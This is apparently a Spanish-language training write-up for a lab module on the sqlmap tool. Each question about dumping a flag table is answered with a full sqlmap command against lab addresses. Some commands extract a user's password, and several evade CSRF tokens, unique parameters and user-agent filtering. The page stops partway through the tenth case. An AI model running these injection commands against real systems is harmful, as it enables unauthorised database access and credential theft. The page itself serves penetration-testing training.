# SQLMap Essentials

{% file src="../.gitbook/assets/Sqlmap_Essentials_Module_Cheat_Sheet.pdf" %}

## Getting Started

### SQLMap Overview

#### Preguntas

**What's the fastest SQLi type?**

UNION query-based

## Building Attacks

### Running SQLMap on an HTTP Request

#### Preguntas

**What's the contents of table flag2? (Case #2)**

Vemos cómo se llaman las bases de datos.

```
sqlmap -u 'http://94.237.57.211:53268/case2.php' --data 'id=1*' --method POST -H 'Content-Type: application/x-www-form-urlencoded' --dbs
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sabiendo como se llama realizamos lo siguiente para ver lo que contiene en dicha tabla.

```
 sqlmap -u 'http://94.237.57.211:53268/case2.php' \
  --data 'id=1*' --method POST \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -D testdb -T flag2 --dump
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag3? (Case #3)**

```
sqlmap -u "http://94.237.57.211:53268/case3.php" --cookie 'id=1*' -T flag3 --dump
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

What's the contents of table flag4? (Case #4)

```
sqlmap -u 'http://94.237.57.211:53268/case4.php' -H 'Content-Type: application/json' --data '{"id":1}' -T flag4 --dump --method POST
```

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Attack Tuning

#### Preguntas

**What's the contents of table flag5? (Case #5)**

```
sqlmap -u 'http://94.237.50.221:57391/case5.php?id=1' -T flag5 --no-cast --dump --batch --risk 3 --level 5
```

<figure><img src="../.gitbook/assets/image (1709).png" alt=""><figcaption></figcaption></figure>



**What's the contents of table flag6? (Case #6)**

```
sqlmap -u 'http://94.237.50.221:57391/case6.php?col=id' -T flag6 --dump --batch --risk 3 --level 5 --prefix='`)'
```

<figure><img src="../.gitbook/assets/image (1710).png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag7? (Case #7)**

```
sqlmap -u 'http://94.237.50.221:57391/case7.php?id=1' --union-cols 5-8 --level=3 --risk=3 --dump -T flag7 --techniqu
e=U -D testdb
```

<figure><img src="../.gitbook/assets/image (1711).png" alt=""><figcaption></figcaption></figure>

## **Database Enumeration**

#### Preguntas

**What's the contents of table flag1 in the testdb database? (Case #1)**

```
sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' -T flag1 --dump --batch --risk 3 --level 5 --dbms MYSQL -D testdb
```

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

### Advanced Database Enumeration

**What's the name of the column containing "style" in it's name? (Case #1)**

```
sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' --batch --search -C "style"
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**What's the Kimberly user's password? (Case #1)**

```
 sqlmap -u 'http://83.136.254.55:50741/case1.php?id=1' --dump --batch --columns -C name,password -T users
```

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Advanced SQLMap Usage

### Bypassing Web Application Protections

#### Preguntas

**What's the contents of table flag8? (Case #8)**

Primero capturamos la petición.

<figure><img src="../.gitbook/assets/image (1712).png" alt=""><figcaption></figcaption></figure>

```
sqlmap -r token.txt -p id --csrf-token="t0ken" \
  --csrf-url="http://94.237.60.55:51043/case8.php" \
  --random-agent --batch \
  --search -T flag8
```

<figure><img src="../.gitbook/assets/image (1713).png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag9? (Case #9)**

Como se tiene un valor único hay que poner el parámetro `--randomize='uid'`

<figure><img src="../.gitbook/assets/image (1714).png" alt=""><figcaption></figcaption></figure>

```
sqlmap -u "http://94.237.60.55:51043/case9.php?id=1&uid=2560757563" \
  -p id \
  --batch \
  --random-agent \
  --randomize=uid \
  -T flag9 --dump --no-cast
```

<figure><img src="../.gitbook/assets/image (1715).png" alt=""><figcaption></figcaption></figure>

**What's the contents of table flag10? (Case #10)**

Parece ignorar cualquier solicitud http enviada a través de sqlmap. Así que para eludir esto, usaremos un agente aleatorio.

